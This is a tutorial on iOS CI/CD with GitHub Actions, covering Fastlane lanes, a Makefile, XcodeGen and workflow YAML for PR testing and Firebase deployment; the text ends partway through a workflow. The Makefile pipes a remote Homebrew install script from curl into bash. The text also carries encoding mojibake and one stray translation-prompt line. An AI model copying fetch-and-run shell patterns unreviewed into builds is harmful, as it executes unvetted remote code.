ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (3): Implementing App iOS CI and CD Workflows with GitHub ActionsiOS App Automation: Complete Guide to Building, Testing, and Deploying with GitHub ActionsPhoto by RobsPrefaceThe previous article ‚ÄúCI/CD Practical Guide (Part 2): Comprehensive Use and Setup of GitHub Actions and Self-hosted Runner‚Äù introduced the basics and workflow of GitHub Actions, how to use your own machine as a Runner, and guided you through three simple automated Actions; this article will focus deeply on building an App (iOS) CI/CD workflow with GitHub Actions in real-world use, walking you step-by-step while supplementing relevant GitHub Actions knowledge.App CI/CD Workflow DiagramThis article focuses on the GitHub Actions section for building CI/CD. The next article, ‚ÄúCI/CD Practical Guide (Part 4): Using Google Apps Script Web App to Connect with GitHub Actions to Build a Free and Easy Packaging Tool Platform,‚Äù will cover the right half, which introduces building a cross-team collaborative packaging platform using Google Apps Script Web App.Workflow: GitHub Actions Triggered by Pull Request, Form Submission, or Scheduled Timing Execute Corresponding Workflow Jobs/Steps Step Executes the Corresponding Fastlane (iOS) or (Android Gradle) Script Fastlane Executes Corresponding xcodebuild (iOS) Commands Get Execution Result Subsequent Workflow Jobs/Steps Process Results Completed GitHub Actions Results ImageFirst, let‚Äôs show the final result to give everyone some motivation to implement!CI TestingCI Nightly Build, CD DeployGitHub Actions x Self-hosted Runner BasicsIf you are not yet familiar with GitHub Actions and setting up a Self-hosted Runner, it is highly recommended to first read the previous article ‚ÄúCI/CD Practical Guide (Part 2): Comprehensive Use and Setup of GitHub Actions and Self-hosted Runner‚Äù or practice alongside the knowledge from that article. Implementation begins!Infra Architecture of the iOS Demo ProjectThe iOS project content used in this article, including test items, is generated by AI, so there is no need to focus on iOS code details. The discussion will only cover Infra &amp; CI/CD aspects. The following tools are based on past experience. For new projects, consider using the newer mise and tuist .MintMint tool helps us unify the management of dependency tool versions (Gemfile can only manage Ruby Gems), such as XCodeGen, SwiftFormat, SwiftLint, Periphery.‚Ä¶etcMintfile:yonaskolb/Mint@0.17.5yonaskolb/XcodeGen@2.35.0nicklockwood/SwiftFormat@0.51.13Here we only use three. If it feels too complicated, you can skip it and directly use brew install to install the required tools in the Action Workflow Step.BundleGemfile:source 'https://rubygems.org'gem 'cocoapods', '~&gt;1.16.0'gem 'fastlane', '~&gt;2.228.0'plugins_path = File.join(File.dirname(__FILE__), 'Product', 'fastlane', 'Pluginfile')eval_gemfile(plugins_path) if File.exist?(plugins_path)Managing Ruby (Gems) dependencies, the two most commonly used tools in iOS projects are cocoapods and fastlane.CocoapodsProduct/podfile:platform :ios, '13.0'use_frameworks!target 'app-ci-cd-github-actions-demo' do pod 'SnapKit'end Although it has been announced as soon to be deprecated, Cocoapods is still common in older iOS projects. Here, a simple Snapkit demo is added.XCodeGenTo avoid conflicts caused by changes to .xcodeproj / .xcworkspace during multi-developer collaboration, use Project.yaml to define the XCode Project content uniformly, then generate the Project files locally (do not commit to Git).Product/project.yaml:name: app-ci-cd-github-actions-demooptions: bundleIdPrefix: com.example deploymentTarget: iOS: '13.0' usesTabs: false indentWidth: 2 tabWidth: 2configs: Debug: debug Release: releasetargets: app-ci-cd-github-actions-demo: type: application platform: iOS sources: - app-ci-cd-github-actions-demo resources: - app-ci-cd-github-actions-demo/Assets.xcassets - app-ci-cd-github-actions-demo/Base.lproj info: path: app-ci-cd-github-actions-demo/Info.plist properties: CFBundleIdentifier: $(PRODUCT_BUNDLE_IDENTIFIER) settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo cocoapods: true app-ci-cd-github-actions-demoTests: type: bundle.unit-test platform: iOS sources: - app-ci-cd-github-actions-demoTests dependencies: - target: app-ci-cd-github-actions-demo info: path: app-ci-cd-github-actions-demoTests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.tests app-ci-cd-github-actions-demoUITests: type: bundle.ui-testing platform: iOS sources: - app-ci-cd-github-actions-demoUITests dependencies: - target: app-ci-cd-github-actions-demo info: path: app-ci-cd-github-actions-demoUITests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.uitests app-ci-cd-github-actions-demoSnapshotTests: type: bundle.unit-test platform: iOS sources: - path: app-ci-cd-github-actions-demoSnapshotTests excludes: - \"**/__Snapshots__/**\" dependencies: - target: app-ci-cd-github-actions-demo - product: SnapshotTesting package: SnapshotTesting info: path: app-ci-cd-github-actions-demoSnapshotTests/Info.plist settings: base: PRODUCT_BUNDLE_IDENTIFIER: com.test.appcicdgithubactionsdemo.snapshottestspackages: SnapshotTesting: url: https://github.com/pointfreeco/swift-snapshot-testing from: 1.18.4SnapshotTesting: Managing with Swift Package Manager.FastlaneEncapsulating complex steps such as xcodebuild commands, integrating with App Store Connect API, Firebase API, and other services.Product/fastlane/Fastfile:default_platform(:ios)platform :ios do desc \"Run all tests (Unit Tests + UI Tests)\" lane :run_all_tests do \\|options\\| device = options[:device] scan( scheme: \"app-ci-cd-github-actions-demo\", device: device, clean: true, output_directory: \"fastlane/test_output\", output_types: \"junit\" ) end desc \"Run only Unit Tests\" lane :run_unit_tests do \\|options\\| device = options[:device] scan( scheme: \"app-ci-cd-github-actions-demo\", device: device, clean: true, only_testing: [ \"app-ci-cd-github-actions-demoTests\" ], output_directory: \"fastlane/test_output\", output_types: \"junit\" ) end desc \"Build and upload to Firebase App Distribution\" lane :beta do \\|options\\| if options[:version_number] &amp;&amp; options[:version_number].to_s.strip != \"\" increment_version_number(version_number: options[:version_number]) end if options[:build_number] &amp;&amp; options[:build_number].to_s.strip != \"\" increment_build_number(build_number: options[:build_number]) end update_code_signing_settings( use_automatic_signing: false, path: \"app-ci-cd-github-actions-demo.xcodeproj\", team_id: ENV['TEAM_ID'], code_sign_identity: \"iPhone Developer\", sdk: \"iphoneos*\", profile_name: \"cicd\" ) gym( scheme: \"app-ci-cd-github-actions-demo\", clean: true, export_method: \"development\", output_directory: \"fastlane/build\", output_name: \"app-ci-cd-github-actions-demo.ipa\", export_options: { provisioningProfiles: { \"com.test.appcicdgithubactionsdemo\" =&gt; \"cicd\", }, } ) firebase_app_distribution( app: \"1:127683058219:ios:98896929fa131c7a80686e\", firebase_cli_token: ENV[\"FIREBASE_CLI_TOKEN\"], release_notes: options[:release_notes] \\|\\| \"New beta build\" ) endendNote: provisioningProfiles and profile_name correspond to the Profiles certificate names in App Developer. (If using match, these do not need to be specified.)Fastlane is an essential part of iOS CI/CD, allowing you to quickly develop the actual CI/CD execution steps by using its pre-packaged methods; we only need to focus on the overall script design without dealing with complex API integrations or command writing.For example: Fastlane only requires writing ‚Äúscan(xxx)‚Äù to run tests, while using xcodebuild needs ‚Äúxcodebuild -workspace ./xxx.xcworkspace -scheme xxx -derivedDataPath xxx ‚Äòplatform=iOS Simulator,id=xxx‚Äô clean build test‚Äù. Packaging and deployment are even more troublesome, as you need to integrate with App Store Connect/Firebase API yourself, and the key authentication alone requires writing over 10 lines of code.The demo project has only three lanes: run_all_tests: Run all types of tests (Snapshot + Unit) run_unit_tests: Run only unit tests (Unit) beta: Packaging and deploying to Firebase App Distribution Fastlane ‚Äî MatchDue to Demo project limitations, Match was not used here to manage the team‚Äôs development and deployment certificates. However, it is recommended to use Match to manage all development and deployment certificates for the team, making control and updates easier and more unified. With Match, you can use commands like match all directly in the project setup step to install all the development certificates you need with one click. Fastlane Match uses another private repo to manage certificate keys. In GitHub Actions, you need to set up the SSH Agent to clone the other private repo.(Please refer to the notes at the end)‚Äî ‚Äî ‚ÄîMakefileMakefileUnify the development side and CI/CD to use Makefile for executing commands, making it easier to package the same environment, paths, and operations. A classic example is that some people use the locally installed pod install, while others use the Bundler-managed bundle exec pod install. Differences may arise if the versions differ. If you find it too complicated and prefer not to use it, you can simply write the commands to execute directly in the Action Workflow Step.Makefile:#!makePRODUCT_FOLDER = ./Product/SHELL := /bin/zsh.DEFAULT_GOAL := installMINT_DIRECTORY := ./mint/export MINT_PATH=$(MINT_DIRECTORY)## üëá Help function.PHONY: helphelp: @echo \"\" @echo \"üìñ Available commands:\" @grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) \\| \\ awk 'BEGIN {FS = \":.*?## \"}; {printf \" \\033[36m%-20s\\033[0m %s\\n\", $$1, $$2}' @echo \"\"## Setup.PHONY: setupsetup: check-mint ## Install Ruby and Mint dependencies @echo \"üî® Installing Ruby dependencies...\" bundle config set path 'vendor/bundle' bundle install @echo \"üî® Installing Mint dependencies...\" mint bootstrap## Install.PHONY: installinstall: XcodeGen PodInstall ## Run XcodeGen and CocoaPods install.PHONY: XcodeGenXcodeGen: check-mint ## Generate .xcodeproj using XcodeGen @echo \"üî® Execute XcodeGen\" cd $(PRODUCT_FOLDER) &amp;&amp; \\ mint run yonaskolb/XcodeGen --quiet.PHONY: PodInstallPodInstall: ## Install CocoaPods dependencies @echo \"üì¶ Installing CocoaPods dependencies...\" cd $(PRODUCT_FOLDER) &amp;&amp; \\ bundle exec pod install### Mintcheck-mint: check-brew ## Check if Mint is installed, install if missing @if ! command -v mint &amp;&gt; /dev/null; then \\ echo \"üî® Installing mint...\"; \\ brew install mint; \\ fi### Brewcheck-brew: ## Check if Homebrew is installed, install if missing @if ! command -v brew &amp;&gt; /dev/null; then \\ echo \"üî® Installing Homebrew...\"; \\ /bin/bash -c \"$$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"; \\ fi## Format only git swift files.PHONY: formatformat: check-mint ## Format all Swift files under Product/ mint run swiftformat $(PRODUCT_FOLDER)To avoid contaminating the entire system or other projects, we try to set the paths of Dependency packages (e.g. mint, bundle, etc.) within the project directory (combined with .gitignore exclusion).‚îú‚îÄ‚îÄ mint (Mint dependencies)‚îÇ ‚îî‚îÄ‚îÄ packages‚îú‚îÄ‚îÄ Product‚îÇ ‚îú‚îÄ‚îÄ app-ci-cd-github-actions-demo‚îÇ ‚îú‚îÄ‚îÄ app-ci-cd-github-actions-demo.xcodeproj‚îÇ ‚îú‚îÄ‚îÄ app-ci-cd-github-actions-demo.xcworkspace‚îÇ ‚îú‚îÄ‚îÄ app-ci-cd-github-actions-demoSnapshotTests‚îÇ ‚îú‚îÄ‚îÄ app-ci-cd-github-actions-demoTests‚îÇ ‚îú‚îÄ‚îÄ app-ci-cd-github-actions-demoUITests‚îÇ ‚îú‚îÄ‚îÄ fastlane‚îÇ ‚îî‚îÄ‚îÄ Pods (Cocoapods dependencies)‚îî‚îÄ‚îÄ vendor (Bundle dependencies) ‚îî‚îÄ‚îÄ bundlePlease provide the Markdown paragraph you want me to translate into English.Unified Project Setup Steps Using Makefine: git clone repo cd ./repo make setupInstall necessary tool dependencies (brew, mint, bundle, xcodegen, swiftformat, ‚Ä¶) make installGenerate the project (run pod install, xcodegen) Completed Open and Run the Project Whether it‚Äôs CI/CD or onboarding new members, build the project following the above steps.This GitHub Actions CI/CD ExampleThis article introduces three GitHub Actions CI/CD workflow examples. You can also refer to these steps to build CI/CD workflows that fit your team‚Äôs needs. CI ‚Äî Run Unit Tests on Pull Request Submission CD ‚Äî Packaging + Deploying to Firebase App Distribution CI + CD ‚Äî Nightly Build: Execute Snapshot + Unit Tests + Packaging + Deploy to Firebase App Distribution Due to demo limitations, this article only covers integration and deployment to Firebase App Distribution. Packaging for Testflight or the App Store follows the same steps, with differences only in the Fastlane scripts. Feel free to adapt as needed.CI ‚Äî Run Unit Tests on Pull RequestProcessThe Develop branch cannot be pushed to directly; updates must be made via Pull Request. All Pull Requests require review approval and passing unit tests before merging. Any new commit push will trigger retesting.CI-Testing.ymlRepo ‚Üí Actions ‚Üí New workflow ‚Üí set up a workflow yourself.# Workflow(Action) Namename: CI-Testing# Actions Log Titlerun-name: \"[CI-Testing] ${{ github.event.pull_request.title \\|\\| github.ref }}\"# Cancel running jobs in the same Concurrency Group if a new job starts# For example, if a commit push triggers a job that hasn't started yet and another commit push happens, the previous job will be canceledconcurrency: group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.event.pull_request.number \\|\\| github.ref }} cancel-in-progress: true# Trigger eventson: # PR events pull_request: # PR opened, reopened, or new push commit types: [opened, synchronize, reopened] # Manual trigger via form workflow_dispatch: # Form inputs inputs: # Test Fastlane Lane to run TEST_LANE: description: 'Test Lane' default: 'run_unit_tests' type: choice options: - run_unit_tests - run_all_tests # Triggered by other workflows # Used by Nightly Build workflow_call: # Form inputs inputs: # Test Fastlane Lane to run TEST_LANE: description: 'Test Lane' default: 'run_unit_tests' # workflow_call inputs do not support choice type: string BRANCH: description: 'Branch' type: string # Jobs# Jobs run concurrentlyjobs: # Job ID testing: # Job name (optional, better readability in logs) name: Testing # Runner Label - use GitHub Hosted Runner macos-15 to run the job # Note: This project is a Public Repo and can use unlimited free minutes # Note: This project is a Public Repo and can use unlimited free minutes # Note: This project is a Public Repo and can use unlimited free minutes # For Private Repo, usage is metered and macOS runners are the most expensive (10x), # running 10 times may reach the 2,000 minutes free limit # Self-hosted Runner is recommended runs-on: macos-15 # Set maximum timeout to avoid endless waiting in abnormal situations timeout-minutes: 30 # use zsh # Optional, default shell is bash but I prefer zsh defaults: run: shell: zsh {0} # Steps # Steps run sequentially steps: # git clone the current repo &amp; checkout the branch to run - name: Checkout repository uses: actions/checkout@v3 with: # Git Large File Storage, not needed in our test environment # default: false lfs: false # Checkout specified branch if provided, otherwise default (current branch) # On schedule events can only run on main branch, so to do Nightly Build on master branch, specify branch here # e.g. on: schedule -&gt; main branch, Nightly Build on master branch ref: ${{ github.event.inputs.BRANCH \\|\\| '' }} # ========== Env Setup Steps ========== # Read project specified XCode version # Later we manually specify XCode_x.x.x.app instead of using xcversion, # because xcversion is deprecated and unstable. - name: Read .xcode-version id: read_xcode_version run: \\| XCODE_VERSION=$(cat .xcode-version) echo \"XCODE_VERSION: ${XCODE_VERSION}\" echo \"xcode_version=${XCODE_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # You can also set global XCode version here to avoid specifying DEVELOPER_DIR later # But this requires sudo privileges; for self-hosted runners ensure the runner has sudo rights # sudo xcode-select -s \"/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer\" # Read project specified Ruby version - name: Read .ruby-version id: read_ruby_version run: \\| RUBY_VERSION=$(cat .ruby-version) echo \"RUBY_VERSION: ${RUBY_VERSION}\" echo \"ruby_version=${RUBY_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # Install or set Runner Ruby version to project specified version - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: \"${{ steps.read_ruby_version.outputs.ruby_version }}\" # Optional, because on self-hosted runners running multiple runners on the same machine, # CocoaPods repos share the directory causing rare conflicts when pod install runs concurrently # GitHub Hosted Runner does not need this setting # - name: Change Cocoapods Repos Folder # if: contains(runner.labels, 'self-hosted') # run: \\| # # Each runner uses own .cocoapods folder to avoid conflicts # mkdir -p \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/\" # export CP_HOME_DIR=\"$HOME/.cocoapods-${{ env.RUNNER_NAME }}\" # rm -f \"$HOME/.cocoapods-${{ env.RUNNER_NAME }}/repos/cocoapods/.git/index.lock\" # ========== Cache Setting Steps ========== # Note: Even self-hosted runners use cloud cache which counts usage # Rules: auto delete if not hit for 7 days, max 10 GB per cache, only cache on successful action # Public Repo: free unlimited # Private Repo: starts at 5 GB # Self-hosted can implement own cache &amp; restore strategies via scripts or other tools # Bundle Cache (Gemfile) # Matches Makefile specified Bundle install path ./vendor - name: Cache Bundle uses: actions/cache@v3 with: path: \\| ./vendor key: ${{ runner.os }}-bundle-${{ hashFiles('Gemfile.lock') }} restore-keys: \\| ${{ runner.os }}-bundle- # CocoaPods Cache (Podfile) # Default path is project/Pods - name: Cache CocoaPods uses: actions/cache@v3 with: path: \\| ./Product/Pods key: ${{ runner.os }}-cocoapods-${{ hashFiles('Product/Podfile.lock') }} restore-keys: \\| ${{ runner.os }}-cocoapods- # Mint cache # Matches Makefile specified Mint install path ./mint - name: Cache Mint uses: actions/cache@v3 with: path: ./mint key: ${{ runner.os }}-mint-${{ hashFiles('Mintfile') }} restore-keys: \\| ${{ runner.os }}-mint- # ==================== # Project Setup &amp; Dependency Installation - name: Setup &amp; Install Dependency run: \\| # Run Makefile wrapped Setup commands, roughly: # brew install mint # bundle config set path 'vendor/bundle' # bundle install # mint bootstrap # ... make setup # Run Makefile wrapped Install commands, roughly: # mint run yonaskolb/XcodeGen --quiet # bundle exec pod install # ... make install # Run Fastlane Unit Test Lane - name: Run Tests id: testing # Set working directory so no need to cd later working-directory: ./Product/ env: # Test plan: run all tests or only unit tests # For PR trigger use run_unit_tests, otherwise use inputs.TEST_LANE or default run_all_tests TEST_LANE: ${{ github.event_name == 'pull_request' &amp;&amp; 'run_unit_tests' \\|\\| github.event.inputs.TEST_LANE \\|\\| 'run_all_tests' }} # Specify XCode version for this job DEVELOPER_DIR: \"/Applications/Xcode_${{ steps.read_xcode_version.outputs.xcode_version }}.app/Contents/Developer\" # Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables # Simulator name SIMULATOR_NAME: ${{ vars.SIMULATOR_NAME }} # Simulator iOS version SIMULATOR_IOS_VERSION: ${{ vars.SIMULATOR_IOS_VERSION }} # Current Runner name RUNNER_NAME: ${{ runner.name }} # Increase XCodebuild timeout and retry count # Machines with heavy load may fail after 3 tries FASTLANE_XCODEBUILD_SETTINGS_TIMEOUT: 60 FASTLANE_XCODEBUILD_SETTINGS_RETRIES: 10 run: \\| # On self-hosted runners running multiple runners on one machine, # simulator contention may occur (explained later) # To avoid this, name simulators after runner name so each runner has its own simulator, # preventing conflicts and test failures # e.g. bundle exec fastlane run_unit_tests device:\"${RUNNER_NAME} (${SIMULATOR_IOS_VERSION})\" # Here using GitHub Hosted Runner so no issue, use device:\"${SIMULATOR_NAME} (${SIMULATOR_IOS_VERSION})\" # Do not exit immediately on error and write all output to temp/testing_output.txt # Later analyze file to distinguish Build Failed or Test Failed and comment different messages to PR set +e # EXIT_CODE stores exit code of execution. # 0 = OK # 1 = exit EXIT_CODE=0 # Write all output to file bundle exec fastlane ${TEST_LANE} device:\"${SIMULATOR_NAME} (${SIMULATOR_IOS_VERSION})\" \\| tee \"$RUNNER_TEMP/testing_output.txt\" # If EXIT_CODE is 0, assign ${pipestatus[1]} to EXIT_CODE [[ $EXIT_CODE -eq 0 ]] &amp;&amp; EXIT_CODE=${pipestatus[1]} # Restore exit on error set -e # Check Testing Output # If output contains \"Error building\", set is_build_error=true for Actions env var, build failed # If output contains \"Tests have failed\", set is_test_error=true for Actions env var, test failed if grep -q \"Error building\" \"$RUNNER_TEMP/testing_output.txt\"; then echo \"is_build_error=true\" &gt;&gt; $GITHUB_OUTPUT echo \"‚ùå Detected Build Error\" elif grep -q \"Tests have failed\" \"$RUNNER_TEMP/testing_output.txt\"; then echo \"is_test_error=true\" &gt;&gt; $GITHUB_OUTPUT echo \"‚ùå Detected Test Error\" fi # Restore Exit Code Output exit $EXIT_CODE # ========== Handle Result Steps ========== # Parse *.junit test report, mark results, comment if PR - name: Publish Test Report # Reuse existing .junit Parser Action: https://github.com/mikepenz/action-junit-report uses: mikepenz/action-junit-report@v5 # if: # previous step (Testing) success or # previous step (Testing) failed and is_test_error (skip if build failed) if: ${{ (failure() &amp;&amp; steps.testing.outputs.is_test_error == 'true') \\|\\| success() }} with: check_name: \"Testing Report\" comment: true updateComment: false require_tests: true detailed_summary: true report_paths: \"./Product/fastlane/test_output/*.junit\" # Build failure comment - name: Build Failure Comment # if: # previous step (Testing) failed and is_build_error and has PR Number if: ${{ failure() &amp;&amp; steps.testing.outputs.is_build_error == 'true' &amp;&amp; github.event.pull_request.number }} uses: actions/github-script@v6 env: action_url: \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/attempts/${{ github.run_attempt }}\" with: script: \\| const action_url = process.env.action_url const pullRequest = context.payload.pull_request \\|\\| {} const commitSha = pullRequest.head?.sha \\|\\| context.sha const creator = pullRequest.user?.login \\|\\| context.actor const commentBody = [ `# Project or Test Build Failed ‚ùå`, `Please ensure your Pull Request can compile and run tests correctly.`, ``, `üîó **Action**: [View Workflow Run](${action_url})`, `üìù **Commit**: ${commitSha}`, `üë§ **Author**: @${creator}` ].join('\\n') await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: context.payload.pull_request.number, body: commentBody })Technical Highlights: runs-on: It is recommended to use a self-hosted Runner, as GitHub Hosted Runner macOS is very expensive. Manually read the .xcode-version file to get the specified XCode version and set the DEVELOPER_DIR environment variable in steps that require a specific XCode version. This allows easy XCode switching without using Sudo. Cache: Can speed up dependency installation, but note that even self-hosted Runners use GitHub Cloud Cache and are subject to billing limits. Use set +e to prevent the script from exiting immediately on command failure, redirect all output to a file, and read the file to determine if it is a Build Failed or Test Failed; otherwise, the message will always be Test Failed.You can also extend this to detect other errors, for example: Underlying Error: Unable to boot the Simulator. Simulator failed to start, please try again. Checkout Code accepts a specified branch: Since the on: schedule event can only be triggered on the main (Default Branch), if we want the schedule to operate on another branch, we need to specify the branch. Specifying the .cocoapods Repo path is optional. Previously, when using self-hosted runners on the same machine, two runners got stuck at pod install because both were operating on the .cocoapods Repo simultaneously, causing a git lock.(However, the chance of this happening is very low.) If you have a Private Pods Repo that requires setting up an SSH Agent to have permission to clone.(Please refer to the supplementary notes at the end) Remember to add in Repo -&gt; Settings -&gt; Actions secrets and variables -&gt; variables:SIMULATOR_IOS_VERSION Simulator iOS versionSIMULATOR_NAME Simulator name Commit files to the Repo main branch and manually trigger a verification to check correctness:Continue with the correct settings.GitHub Workflow SetupRepo ‚Üí Settings ‚Üí Rules ‚Üí Rulesets„ÄÇ Ruleset Name: Ruleset Name Enforcement status: Enable/Disable this rule restriction Target branches: The target Base branches. Setting the Default Branch means all branches intended to merge into main or develop are subject to this rule. Bypass list: Specific identities or Teams can be exempted from this restriction Branch rules: Restrict deletions: Prohibit branch deletions Require a pull request before merging: Only allow merging through PRRequired approvals: Limit the number of required approvals Require status checks to pass: Restrict which checks must pass before mergingClick + Add checks, enter Testing, and select the one with the GitHub Actions icon.There is a small issue here: if Suggestions cannot find Testing, you need to go back to Actions and trigger it first (try opening a PR) to succeed once, then it will appear here. Block force pushes: Disable Force PushAfter saving and confirming the Enforcement status is Active, the rule will take effect.After everything is set, open a PR to test it: Checks show CI-Testing (Required), Merging is blocked, and At least X approving review is required by reviewers with write access. This means the setup is successful.If the project build fails (Build Failed), it will Comment:If the project builds successfully but the test cases fail (Test Failed), it will Comment:If the project build and test are successful (Test Success), it will Comment:After completing Review Approve + Check tests successfully:Demo PRThen you can merge the PR. If a new commit is pushed, the checks will automatically rerun.Full Code: CI-Testing.ymlAuto-merge:Additionally, you can also open Repo Settings ‚Üí General ‚Üí Pull Request and enable: Automatically delete head branches: Automatically delete branches after merging PRs Allow Auto-merge: When checks pass and the required approvals are met, the PR will be merged automatically.The Enable auto-merge button only appears when conditions are set and the current conditions do not yet allow merging. CD ‚Äî Packaging + Deployment to Firebase App DistributionProcessUsing GitHub Actions form to trigger packaging tasks, you can specify the version number and Release Notes. After packaging, the app will be automatically uploaded to Firebase App Distribution for the team to download and test.CD-Deploy.ymlRepo ‚Üí Actions ‚Üí New workflow ‚Üí set up a workflow yourself.# Workflow(Action) namename: CD-Deploy# Actions Log titlerun-name: \"[CD-Deploy] ${{ github.ref }}\"# Cancel in-progress jobs in the same concurrency group if a new job starts# For example, repeated triggers of the same branch build job will cancel the previous oneconcurrency: group: ${{ github.workflow }}-${{ github.event_name }}-${{ github.ref }} cancel-in-progress: true# Trigger eventson: # Manual form trigger workflow_dispatch: # Form inputs inputs: # App version number VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App build number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App release note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string # Other workflows calling this workflow # Used by Nightly Build workflow_call: inputs: # App version number VERSION_NUMBER: description: 'Version Number of the app (e.g., 1.0.0). Auto-detect from the Xcode project if left blank.' required: false type: string # App build number BUILD_NUMBER: description: 'Build number of the app (e.g., 1). Will use a timestamp if left blank.' required: false type: string # App release note RELEASE_NOTE: description: 'Release notes of the deployment.' required: false type: string BRANCH: description: 'Branch' type: string# Define global static variablesenv: APP_STORE_CONNECT_API_KEY_FILE_NAME: \"app_store_connect_api_key.json\"# Jobs# Jobs run concurrentlyjobs: # Job ID deploy: # Job name (optional, better readability in logs) name: Deploy - Firebase App Distribution # Runner label - use GitHub Hosted Runner macos-15 to run the job # Note: This project is a Public Repo and can use unlimited free minutes # Note: This project is a Public Repo and can use unlimited free minutes # Note: This project is a Public Repo and can use unlimited free minutes # For Private Repos, usage is billed; macOS runners are the most expensive (10x), # running 10 times may reach the 2,000 free minutes limit # Self-hosted Runner is recommended runs-on: macos-15 # Set maximum timeout to prevent endless waiting on errors timeout-minutes: 30 # use zsh # Optional, just my preference; default is bash defaults: run: shell: zsh {0} # Job steps # Steps run sequentially steps: # git clone current repo &amp; checkout to the running branch - name: Checkout repository uses: actions/checkout@v3 with: # Git Large File Storage, not needed for our test environment # default: false lfs: false # Checkout specified branch if given; otherwise use default (current branch) # Because on: schedule events run only on main branch, to do Nightly Build etc. you need to specify branch # e.g. on: schedule -&gt; main branch, Nightly Build master branch ref: ${{ github.event.inputs.BRANCH \\|\\| '' }} # ========== Certificates Steps ========== # Recommended to use Fastlane - Match to manage development certificates and run match in lane directly # Match uses a private repo to manage certificates, but you need to set up SSH Agent to have permission to git clone the private repo # ref: https://stackoverflow.com/questions/57612428/cloning-private-github-repository-within-organisation-in-actions # # # --- Below is the approach without using Fastlane - Match, directly download &amp; import certificates to Runner --- # ref: https://docs.github.com/en/actions/how-tos/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development # # GitHub Actions Secrets cannot store files, so all certificates must be converted to Base64 encoded text stored in Secrets # In the GitHub Actions step, decode and write to TEMP files dynamically and move to correct locations for system use # See article for other setup details # - name: Install the Apple certificate and provisioning profile env: BUILD_CERTIFICATE_BASE64: ${{ secrets.BUILD_CERTIFICATE_BASE64 }} P12_PASSWORD: ${{ secrets.BUILD_CERTIFICATE_P12_PASSWORD }} BUILD_PROVISION_PROFILE_BASE64: ${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }} # GitHub Hosted Runner is a custom string # Self-hosted Runner is machine login password KEYCHAIN_PASSWORD: ${{ secrets.KEYCHAIN_PASSWORD }} run: \\| # create variables CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12 PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db # import certificate and provisioning profile from secrets echo -n \"$BUILD_CERTIFICATE_BASE64\" \\| base64 --decode -o $CERTIFICATE_PATH echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" \\| base64 --decode -o $PP_PATH # create temporary keychain security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security set-keychain-settings -lut 21600 $KEYCHAIN_PATH security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH # import certificate to keychain security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security list-keychain -d user -s $KEYCHAIN_PATH # apply provisioning profile mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles # App Store Connect API Fastlane JSON Key # Another almost essential App Store Connect API Fastlane JSON Key (.json) in build environment # format: .json content format: https://docs.fastlane.tools/app-store-connect-api/ # contains App Store Connect API .p8 Key # will be passed to Fastlane later for uploading to Testflight, App Store API usage # # GitHub Actions Secrets cannot store files, so all certificates must be converted to Base64 encoded text stored in Secrets # In GitHub Actions step, decode and write to TEMP file for other steps to reference # See article for other setup details - name: Read and Write Apple Store Connect API Key to Temp env: APP_STORE_CONNECT_API_KEY_BASE64: ${{ secrets.APP_STORE_CONNECT_API_KEY_BASE64 }} APP_STORE_CONNECT_API_KEY_PATH: \"${{ runner.temp }}/${{ env.APP_STORE_CONNECT_API_KEY_FILE_NAME }}\" run: \\| # import certificate and provisioning profile from secrets echo -n \"$APP_STORE_CONNECT_API_KEY_BASE64\" \\| base64 --decode -o $APP_STORE_CONNECT_API_KEY_PATH # ========== Env Setup Steps ========== # Read project specified XCode version # Later we manually specify the XCode_x.x.x.app to use # Not using xcversion because it is sunset and unstable - name: Read .xcode-version id: read_xcode_version run: \\| XCODE_VERSION=$(cat .xcode-version) echo \"XCODE_VERSION: ${XCODE_VERSION}\" echo \"xcode_version=${XCODE_VERSION}\" &gt;&gt; $GITHUB_OUTPUT # Can also specify global XCode version here to avoid specifying DEVELOPER_DIR later # But this command requires sudo privileges; if self-hosted runner, ensure runner environment has sudo rights # sudo xcode-select -s \"/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer\" # Read project specified Ruby version - name: Read .ruby-version id: read_ruby_version run: \\| RUBY_VERSION=$(cat .ruby-version) echo \"RUBY_VERSION: ${RUBY_VERSION}\" echo \"ruby_version=${RUBY_VERSION}\" &gt;&gt; 